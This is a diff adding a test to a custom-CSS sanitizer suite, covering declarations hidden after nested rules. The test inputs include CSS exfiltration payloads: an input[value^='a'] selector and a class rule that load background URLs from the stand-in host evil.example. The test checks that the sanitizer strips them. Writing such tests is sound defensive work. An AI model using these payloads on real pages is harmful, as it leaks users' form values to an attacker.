@@ -361,6 +361,29 @@ describe("custom CSS may not reach off this origin", () => {
     expect(fine.css.replace(/\s+/g, "")).toContain("color:red");
   });
 
+  it("reads a declaration written after a nested rule", () => {
+    // CSS nesting allows declarations on either side of a nested rule, and
+    // css-tree hands the whole block over as one `Raw`. Re-parsed as a
+    // stylesheet the nested rule becomes a Rule and the trailing declaration
+    // stays a top-level `Raw` belonging to no block, which a collector that
+    // only looked inside blocks walked straight past.
+    for (const css of [
+      `input[value^="a"] { .child { color: red } background: url("https://evil.example/a") }`,
+      `.a { .child { color: red } background-image: url("https://evil.example/b") }`,
+    ]) {
+      const out = sanitizeCustomCss(css, SCOPE);
+      expect(out.css).not.toContain("evil.example");
+      expect(out.warnings.map(w => w.code)).toContain("remote-url");
+    }
+    // The same shape with nothing remote in it is untouched.
+    const fine = sanitizeCustomCss(
+      `.a { .child { color: red } color: blue }`,
+      SCOPE
+    );
+    expect(fine.warnings).toEqual([]);
+    expect(fine.css).toContain("color: blue");
+  });
+
   it("refuses nesting past the bound as unchecked, not as a URL", () => {
     // Rules deeper than the scan follows are still removed — unreadable is not
     // safe — but the reason given has to be the real one. Reporting them as
